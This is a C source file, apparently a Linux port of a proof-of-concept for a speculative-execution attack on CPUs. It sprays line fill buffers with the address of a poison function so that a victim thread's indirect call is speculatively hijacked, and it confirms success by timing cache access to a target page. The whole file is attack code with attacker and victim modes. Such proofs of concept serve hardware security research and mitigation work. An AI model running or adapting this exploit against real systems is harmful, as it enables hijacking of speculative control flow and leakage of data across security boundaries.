#define _GNU_SOURCE
#include <emmintrin.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

#ifndef DWORD
#define WINAPI
typedef unsigned long DWORD;
typedef DWORD* DWORD_PTR;
typedef short WCHAR;
typedef void * HANDLE;
#define MAX_PATH    PATH_MAX
typedef unsigned char BYTE;
typedef unsigned short WORD;
typedef unsigned int BOOL;
typedef void VOID;
typedef BYTE* PBYTE;
typedef unsigned long long UINT64;
typedef void* PVOID;
typedef size_t SIZE_T;
typedef UINT64* PUINT64;
#define TRUE 1
#endif

VOID SprayFillBuffers(PBYTE buffer);
VOID PoisonFunction(PBYTE target);
VOID VictimFunctionTsx(PBYTE Buffer);
VOID VictimFunctionFault(PBYTE Buffer);
UINT64 MeasureAccessTime(PBYTE mem);

PBYTE gSprayPage = NULL;
UINT64 gTargetPage = 0x00000000BDBD0000;

void* Thread1(PVOID Argument)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(2, &cpu_set);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set);

    printf("Spray thread started...\n");

    while (TRUE)
    {
        SprayFillBuffers(gSprayPage);
    }

    printf("Done 1!\n");

}

void* Thread2(PVOID Argument)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(2, &cpu_set);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set);

    printf("Victim thread started...\n");

    while (TRUE)
    {
        // Either VictimFunctionTsx or VictimFunctionFault will do.
        VictimFunctionTsx(0);
        ///VictimFunctionFault(0);

        // Check if the gTargetPage has been cached. Note that the only place this page is accessed from is the
        // PoisonFunction, so if we see this page cached, we now that the PoisonFunction got executed speculatively.
        _mm_mfence();

        UINT64 t = MeasureAccessTime((PBYTE)gTargetPage);
        if (t < 100)
        {
            printf("BINGO!!!! The sprayed function has been executed, access time = %llu\n", t);
            return NULL;
        }

        _mm_mfence();
    }

    printf("Done 2!\n");

}

int main(int argc, char *argv[])
{
    BYTE mode = 0;
    PBYTE target = NULL;

    if (argc == 1)
    {
        // Run in both modes - both the attacker & the victim will run inside this process.
        mode = 0;
    }
    else if (argv[1][0] == '1')
    {
        // Run in attacker mode. Only start Thread1, which sprays the LFBs.
        mode = 1;
    }
    else if (argv[1][0] == '2')
    {
        // Run in victim mode. Only start Thread2, which will to a "CALL [0]".
        mode = 2;
    }

    if (mode == 0 || mode == 2)
    {
        // Allocate the target buffer. This buffer will be accessed speculatively by the PoisonFunction, if it ever
        // gets executed.
        // If we see that this gTargetPage is cached, we will now that PoisonFunction got executed speculatively.
        int fd = -1;
        if ((fd = open("/dev/zero", O_RDWR, 0)) == -1) {
            printf("open failed\n");
            return -1;
        }
        target = mmap((void*)gTargetPage, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0);
        if (NULL == target)
        {
            //printf("Poison buffer alloc failed: 0x%08x\n", GetLastError());
            printf("Poison buffer alloc failed: %s\n", strerror(errno));
            return -1;
        }
        if (mprotect(target, 0x10000, PROT_WRITE | PROT_READ) != 0) {
            printf("Poison buffer commit failed: %s\n", strerror(errno));
            return 1;
        }

        memset(target, 0xCC, 0x10000);

        _mm_clflush(target);
        _mm_mfence();
    }

    if (mode == 0 || mode == 1)
    {
        // Allocate the page containing the address of our function. We will access this page in a loop, in order
        // to spray the LFBs with the address of the PoisonFunction, hoping that a branch will speculatively fetch
        // its address from the LFBs.
        int fd = -1;
        if ((fd = open("/dev/zero", O_RDWR, 0)) == -1) {
            printf("open failed\n");
            return -1;
        }
        gSprayPage = mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED | MAP_ANON, -1, 0);
        if (NULL == gSprayPage)
        {
            printf("Function page alloc failed: %s\n", strerror(errno));
            return -1;
        }
        if (mprotect(gSprayPage, 0x1000, PROT_WRITE | PROT_READ) != 0) {
            printf("Function page commit failed: %s\n", strerror(errno));
            return 1;
        }

        // Fill the page with the address of the poison function.
        for (DWORD i = 0; i < 0x1000 / 8; i++)
        {
            ((PUINT64)gSprayPage)[i] = (UINT64)&PoisonFunction;
        }
    }

    // Create the 2 threads.
    pthread_t t1, t2;

    t1 = t2 = -1;
    int err = 0;

    if (mode == 0)
    {
        // Create both the attacker and the victim.
        if ((err = pthread_create(&t1, NULL, Thread1, NULL)) != 0) {
            printf("error creating thread 1: %s\n", strerror(err));
        }
        if ((err = pthread_create(&t2, NULL, Thread2, NULL)) != 0) {
            printf("error creating thread 2: %s\n", strerror(err));
        }
    }
    else if (mode == 1)
    {
        // Create only the attacker.
        if ((err = pthread_create(&t1, NULL, Thread1, NULL)) != 0) {
            printf("error creating thread 1: %s\n", strerror(err));
        }
    }
    else if (mode == 2)
    {
        // Create only the victim.
        if ((err = pthread_create(&t2, NULL, Thread2, NULL)) != 0) {
            printf("error creating thread 2: %s\n", strerror(err));
        }
    }

    // Will never return, since the threads execute an infinite loop.
    if (mode == 0 || mode == 1)
    {
        pthread_join(t1, NULL);
    }

    if (mode == 0 || mode == 2)
    {
        pthread_join(t2, NULL);
    }

    return 0;
}
